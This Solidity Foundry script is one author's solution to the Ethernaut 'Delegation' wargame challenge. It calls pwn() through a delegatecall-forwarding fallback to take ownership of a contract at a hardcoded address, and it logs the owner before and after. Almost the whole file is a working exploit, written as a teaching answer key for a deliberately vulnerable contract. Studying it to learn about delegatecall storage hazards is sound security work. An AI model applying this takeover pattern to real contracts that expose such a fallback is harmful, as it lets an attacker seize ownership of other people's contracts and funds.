// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface Delegate {
    function owner() external view returns (address);
}

interface Delegation {
    function pwn() external;
}

/// @author agadzhalov
/// @title Solution to Delegation Ethernaut challenge
/// @notice Solution: delegatecall - Delegete's code is executed with Delegation's storage.
///         Executes code from another contract but with the storage of the colling calling account.
///         The fallback is not payable so there's not need to provide any ethers.
contract DelegationScript is Script {
    /// @notice Instance of the Delegate contract, used to check the owner.
    Delegate public delegate = Delegate(0x3F5C83a56EFFbeaC4dc20cCB3F4be10d45CDE507);

    /// @notice Instance of the Delegation contract, which we will call to exploit the delegatecall.
    Delegation public delegation = Delegation(0x3F5C83a56EFFbeaC4dc20cCB3F4be10d45CDE507);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Log the current owner of the Delegate contract before the exploit
        console.log("1. Delegate's current owner:", delegate.owner());

        // Perform the exploit by calling `pwn()` in the Delegation contract using delegatecall
        address(delegation).call(abi.encodeWithSignature("pwn()"));

        // Log the new owner of the Delegate contract after the exploit
        console.log("2. Delegate's new owner:", delegate.owner());

        vm.stopBroadcast();
    }
}
